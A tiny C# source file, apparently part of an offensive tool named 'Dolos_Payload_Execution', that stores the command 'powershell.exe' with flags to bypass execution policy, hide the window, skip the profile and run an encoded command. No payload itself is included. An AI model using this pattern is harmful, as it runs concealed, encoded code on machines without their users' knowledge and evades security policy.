using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Dolos_Payload_Execution
{
    class Commands
    {
       public static String[] commands = new String[]{
            "powershell.exe",
            "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -encodedcommand"
            };
    }
}
